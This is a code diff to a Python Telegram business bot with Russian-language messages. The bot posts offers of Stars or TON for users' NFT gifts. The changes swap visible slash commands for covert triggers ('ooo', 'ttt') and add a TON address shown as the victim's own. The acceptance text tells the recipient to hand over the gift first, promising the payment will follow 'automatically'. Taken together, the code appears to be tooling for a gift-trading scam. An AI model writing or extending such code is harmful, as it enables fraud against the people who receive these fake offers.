@@ -36,7 +36,6 @@ bot_name = ""
 connections, offers = {}, {}
 tasks = set()
 
-# ID премиум-эмодзи
 EMOJI_CROSS = "5260342697075416641"
 EMOJI_CHECK = "5260416304224936047"
 EMOJI_TG = "5258073068852485953"
@@ -122,9 +121,12 @@ def load():
 
 NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 SLUG = re.compile(r"^(.+)-(\d+)$")
-USAGE = ("Формат: <code>/offer ссылка сумма</code> (звезды) или <code>/ton ссылка сумма</code> (TON)\n"
-         "Пример: <code>/offer https://t.me/nft/DurovsCap-1234 500</code>\n"
-         "Пример: <code>/ton https://t.me/nft/DurovsCap-1234 5</code>")
+TON_ADDRESS = re.compile(r"(?:EQ|UQ)[A-Za-z0-9_-]{46}", re.I)
+
+USAGE = ("Формат:\n"
+         "<code>ooo ссылка сумма</code> (звезды)\n"
+         "<code>ttt ссылка сумма</code> (TON)\n"
+         "<code>ttt ссылка адрес сумма</code> (TON на кошелек)")
 
 
 def gift_name(slug):
@@ -142,15 +144,26 @@ def parse_offer(arg):
     name = gift_name(slug)
     if not name:
         return None, "Это не похоже на ссылку на NFT: в конце должен быть номер."
-    rest = f"{arg[:link.start()]} {arg[link.end():]}"
+    
+    rest = f"{arg[:link.start()]} {arg[link.end():]}".strip()
+    
+    # Ищем адрес TON (начинается на EQ или UQ, длина 48)
+    address_match = TON_ADDRESS.search(rest)
+    address = address_match.group(0) if address_match else None
+    
+    # Убираем адрес из строки, чтобы найти сумму
+    if address:
+        rest = rest.replace(address, "")
+        
     amount = re.search(r"\d[\d_,]*", rest)
     if not amount:
         return None, "Не нашёл сумму."
-    # Убираем запятые и пробелы
     val = int(re.sub(r"[_,]", "", amount.group()))
+    
     if not 1 <= val <= MAX_STARS:
         return None, f"Сумма должна быть от 1 до {num(MAX_STARS)}."
-    return {"slug": slug, "name": name, "amount": val}, None
+        
+    return {"slug": slug, "name": name, "amount": val, "address": address}, None
 
 
 def maker_label(o):
@@ -162,12 +175,6 @@ def gift_link(o):
     return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'
 
 
-def amount_text(o):
-    if o.get("currency") == "TON":
-        return f"{num(o['amount'])} TON"
-    return f'{num(o["amount"])} звёзд'
-
-
 def left_text(seconds):
     minutes = math.ceil(max(0, seconds) / 60)
     h, m = divmod(minutes, 60)
@@ -175,20 +182,39 @@ def left_text(seconds):
 
 
 def offer_text(o):
-    text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount_text(o)}</b> за подарок {gift_link(o)}.\n\n"
-            f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
+    if o.get("currency") == "TON":
+        addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
+        amount = f"{num(o['amount'])} TON"
+        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
+                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
+    else:
+        amount = f'{num(o["amount"])} звёзд'
+        text = (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
+                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
     return text + (f"\n\n{esc(TEST_NOTICE)}" if TEST_NOTICE else "")
 
 
 def accepted_text(o):
     u = o["maker"]
     username = u.get("username") or "пользователя"
-    return (
-        f"<b>Сделка принята!</b>\n\n"
-        f"Передайте подарок {gift_link(o)} "
-        f"пользователю @{esc(username)} для успешного закрытия сделки, "
-        f"после чего <b>{amount_text(o)}</b> отправятся на ваш баланс."
-    )
+    
+    if o.get("currency") == "TON":
+        addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
+        amount = f"{num(o['amount'])} TON"
+        return (
+            f"<b>Сделка принята!</b>\n\n"
+            f"Передайте подарок {gift_link(o)} "
+            f"пользователю @{esc(username)} для успешного закрытия сделки, "
+            f"после чего <b>{amount}</b> автоматически отправятся на ваш баланс{addr_text}."
+        )
+    else:
+        amount = f'{num(o["amount"])} звёзд'
+        return (
+            f"<b>Сделка принята!</b>\n\n"
+            f"Передайте подарок {gift_link(o)} "
+            f"пользователю @{esc(username)} для успешного закрытия сделки, "
+            f"после чего <b>{amount}</b> отправятся на ваш баланс."
+        )
 
 
 def declined_text(o):
@@ -196,7 +222,7 @@ def declined_text(o):
 
 
 def expired_text(o):
-    return f"Предложение {amount_text(o)} за подарок {gift_link(o)} истекло."
+    return "Предложение истекло."
 
 
 def offer_kb(o):
@@ -350,7 +376,10 @@ async def on_connection(c):
         text = "⚠️ Бот подключён, но без права отвечать."
     else:
         text = ("✅ <b>Готово, бот подключён.</b>\n\n"
-                "В любом чате напиши:\n<code>/offer ссылка сумма</code> (звезды)\n<code>/ton ссылка сумма</code> (TON)")
+                "В любом чате напиши:\n"
+                "<code>ooo ссылка сумма</code>\n"
+                "<code>ttt ссылка сумма</code>\n"
+                "<code>ttt ссылка адрес сумма</code>")
     await send(conn["chat"], text)
 
 
@@ -365,10 +394,14 @@ async def get_connection(bcid):
 
 
 async def on_business_message(m):
-    text = (m.get("text") or "")
+    text = (m.get("text") or "").strip()
     cmd = text.partition(" ")[0].lower()
     
-    if cmd not in ("/offer", "/ton"):
+    if cmd == "ooo":
+        currency = "STARS"
+    elif cmd == "ttt":
+        currency = "TON"
+    else:
         return
         
     conn = await get_connection(m["business_connection_id"])
@@ -379,7 +412,6 @@ async def on_business_message(m):
         return await send(conn["chat"], "⚠️ У бота нет права отвечать на сообщения.")
         
     maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
-    currency = "TON" if cmd == "/ton" else "STARS"
     
     await make_offer(m, maker, conn["id"], currency)
 
@@ -459,11 +491,12 @@ async def main():
         raise SystemExit("BOT_TOKEN не подходит")
     bot_name = me["username"]
     log.info("юзернейм бота: @%s", bot_name)
+    
+    # Команды для меню бота (хотя они не слэш, добавим для вида)
     await api("setMyCommands", commands=[
-        {"command": "start", "description": "Подключение"},
-        {"command": "offer", "description": "Оффер в звёздах"},
-        {"command": "ton", "description": "Оффер в TON"}
+        {"command": "start", "description": "Подключение"}
     ])
+    
     background(sweeper())
     if PUBLIC_URL:
         app = web.Application()
